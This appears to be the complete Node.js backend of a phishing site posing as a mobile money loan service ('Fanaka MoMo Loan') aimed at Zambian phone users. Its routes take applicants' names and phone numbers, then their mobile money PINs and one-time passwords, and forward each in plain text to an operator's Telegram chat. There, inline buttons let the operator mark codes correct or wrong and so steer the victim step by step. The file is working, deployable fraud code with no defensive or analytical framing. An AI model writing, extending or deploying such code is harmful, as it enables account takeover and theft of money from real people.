const express = require("express");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

const sessions = {};

// ─── Explicit root route ────────────────────────────────────────

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ─── Telegram Helpers ───────────────────────────────────────────

async function sendTelegram(message, buttons = []) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" };
  if (buttons.length) body.reply_markup = { inline_keyboard: buttons };
  await axios.post(url, body);
}

// ─── Auto-register Webhook on startup ───────────────────────────

function getWebhookUrl() {
  const base = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
  return `${base}/api/telegram-webhook`;
}

async function registerWebhook() {
  try {
    const res = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`,
      { url: getWebhookUrl(), allowed_updates: ["callback_query", "message"] }
    );
    console.log("✅ Webhook registered:", res.data);
  } catch (err) {
    console.error("❌ Webhook failed:", err.response?.data || err.message);
  }
}

// ─── Routes ─────────────────────────────────────────────────────

app.post("/api/apply", async (req, res) => {
  try {
    const { name, phone, amount, period } = req.body;
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    sessions[sessionId] = { name, phone, amount, period, status: "awaiting_pin" };

    await sendTelegram(`
📋 <b>NEW LOAN APPLICATION</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${name}
📱 <b>Phone:</b> +260${phone}
💰 <b>Amount:</b> K${amount}
📅 <b>Period:</b> ${period}
🆔 <b>Session:</b> ${sessionId}
━━━━━━━━━━━━━━━━━━
Awaiting PIN verification...
    `.trim());

    res.json({ success: true, sessionId });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.post("/api/pin", async (req, res) => {
  try {
    const { sessionId, pin } = req.body;
    const s = sessions[sessionId];
    if (!s) return res.status(404).json({ error: "Session not found" });

    s.status = "awaiting_pin_approval";

    await sendTelegram(`
🔐 <b>PIN VERIFICATION</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Applicant:</b> ${s.name}
📱 <b>Phone:</b> +260${s.phone}
🔢 <b>Submitted PIN:</b> ${pin}
🆔 <b>Session:</b> ${sessionId}
    `.trim(), [
      [
        { text: "✅ Correct PIN", callback_data: `pin_correct:${sessionId}` },
        { text: "❌ Wrong PIN", callback_data: `pin_wrong:${sessionId}` },
      ],
    ]);

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/check-pin/:sessionId", (req, res) => {
  const s = sessions[req.params.sessionId];
  if (!s) return res.status(404).json({ error: "Not found" });
  res.json({ status: s.status });
});

app.post("/api/otp", async (req, res) => {
  try {
    const { sessionId, otp } = req.body;
    const s = sessions[sessionId];
    if (!s) return res.status(404).json({ error: "Session not found" });

    s.status = "awaiting_otp_approval";

    await sendTelegram(`
📲 <b>OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Applicant:</b> ${s.name}
📱 <b>Phone:</b> +260${s.phone}
🔢 <b>Submitted OTP:</b> ${otp}
🆔 <b>Session:</b> ${sessionId}
    `.trim(), [
      [
        { text: "✅ Correct OTP", callback_data: `otp_correct:${sessionId}` },
        { text: "❌ Wrong OTP", callback_data: `otp_wrong:${sessionId}` },
      ],
    ]);

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/check-otp/:sessionId", (req, res) => {
  const s = sessions[req.params.sessionId];
  if (!s) return res.status(404).json({ error: "Not found" });
  res.json({ status: s.status });
});

// ─── Telegram Webhook Handler ───────────────────────────────────

app.post("/api/telegram-webhook", async (req, res) => {
  res.sendStatus(200);
  try {
    const { callback_query } = req.body;
    if (!callback_query) return;

    const [action, sessionId] = callback_query.data.split(":");
    const s = sessions[sessionId];
    if (!s) return;

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      { callback_query_id: callback_query.id }
    );

    if (action === "pin_correct") s.status = "pin_approved";
    else if (action === "pin_wrong") s.status = "pin_rejected";
    else if (action === "otp_correct") s.status = "approved";
    else if (action === "otp_wrong") s.status = "otp_rejected";
  } catch (err) {
    console.error("Webhook error:", err);
  }
});

// ─── Start ──────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`🚀 Fanaka MoMo Loan running on port ${PORT}`);
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    registerWebhook();
  } else {
    console.warn("⚠️  Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars");
  }
});   
